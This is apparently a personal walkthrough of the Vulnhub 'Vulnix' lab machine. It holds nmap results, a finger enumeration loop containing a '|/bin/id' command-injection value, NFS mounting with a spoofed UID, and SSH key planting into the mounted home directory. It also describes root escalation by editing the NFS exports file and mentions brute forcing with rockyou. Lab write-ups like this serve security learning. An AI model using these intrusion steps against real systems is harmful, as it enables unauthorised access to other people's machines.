#nfs #rpc-bind
# nmap
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: 2023-09-02T11:53:02+00:00; -1h38m53s from scanner time.
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3       Dovecot pop3d
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_pop3-capabilities: TOP PIPELINING RESP-CODES STLS SASL CAPA UIDL
|_ssl-date: 2023-09-02T11:53:02+00:00; -1h38m53s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      32768/tcp   mountd
|   100005  1,2,3      35592/udp6  mountd
|   100005  1,2,3      35616/tcp6  mountd
|   100005  1,2,3      40963/udp   mountd
|   100021  1,3,4      39338/udp   nlockmgr
|   100021  1,3,4      50638/udp6  nlockmgr
|   100021  1,3,4      52919/tcp6  nlockmgr
|   100021  1,3,4      60902/tcp   nlockmgr
|   100024  1          43049/udp6  status
|   100024  1          47654/tcp   status
|   100024  1          48479/tcp6  status
|   100024  1          48906/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: STARTTLS OK LITERAL+ have more IDLE post-login IMAP4rev1 ID LOGIN-REFERRALS LOGINDISABLEDA0001 ENABLE listed capabilities Pre-login SASL-IR
|_ssl-date: 2023-09-02T11:53:02+00:00; -1h38m53s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_imap-capabilities: more AUTH=PLAINA0001 LITERAL+ have IDLE post-login IMAP4rev1 ID LOGIN-REFERRALS Pre-login ENABLE listed capabilities OK SASL-IR
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2023-09-02T11:53:02+00:00; -1h38m53s from scanner time.
995/tcp   open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING RESP-CODES USER SASL(PLAIN) CAPA UIDL
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2023-09-02T11:53:02+00:00; -1h38m53s from scanner time.
2049/tcp  open  nfs        2-4 (RPC #100003)
32768/tcp open  mountd     1-3 (RPC #100005)
39117/tcp open  mountd     1-3 (RPC #100005)
44704/tcp open  mountd     1-3 (RPC #100005)
47654/tcp open  status     1 (RPC #100024)
60902/tcp open  nlockmgr   1-4 (RPC #100021)
```

While trying a bit on smtp port , sought to access the finger port :
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902195426.png]]
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902213102.png]]

![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902212457.png]]

```bash
for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; finger "$q@192.168.1.20"; echo -e "\n";done
```

we also see that there's nfs running so we try to mount it:
```
mount -t nfs 192.168.1.20:/ ./tempd -o nolock
```
we also need to make uid manipulation:
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902205653.png]]
```
openssl s_client -connect 192.168.1.20:995 -crlf -quiet 
```
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902230220.png]]
MAIL from: must be from someone else , and we need to give proper mail template
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902230539.png]]
This could be a potential , as if root user would have opened the mail we could have got the shell like this:
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902231053.png]]
but since there's no one reading the mail , no cron job, learn from here: 
`https://attackdefense.com/challengedetailsnoauth?cid=516`

PS: don't give the above command:
```
sudo mount 192.168.1.20:/home/vulnix /mnt/vulnix -o vers=3
```
:🤯🤯🤯🤯🤯  DUE TO THE VERSION BEING UPDATED THE MOUNT UTILITY FOR SAFETY PURPOSES , AUTO LOCKED THE DIRECTORY WITH NOBODY AND NOGROUP 🤯🤯🤯🤯🤯🤯
so use vers=3
while the blog from 2016 had no problem:
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902233342.png]]
add the user:
```
sudo adduser -u 2008 vulnix
```
then :
```
ssh-keygen -t ssh-rsa
```
after it:
```
cp ~/.ssh/id_rsa.pub ./vulnix/.ssh/authorized_keys
```
Since the ssh is old:
```
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@192.168.1.20
```

# Priv esc:
just do sudo -l and see that a file is editible, this is the same file that specifies that what to mount on nfs. and with whose privileges , just edit the file and mount root folder
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230903002812.png]]
![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230903002945.png]]

# last option:
bruteforcing is the last option
user enum list with finger and passwordlist: rockyou

![[walkthroughs/Vulnhub/Vulnix/IMG/Pasted image 20230902233427.png]]
RABBIT HOLE!!!!!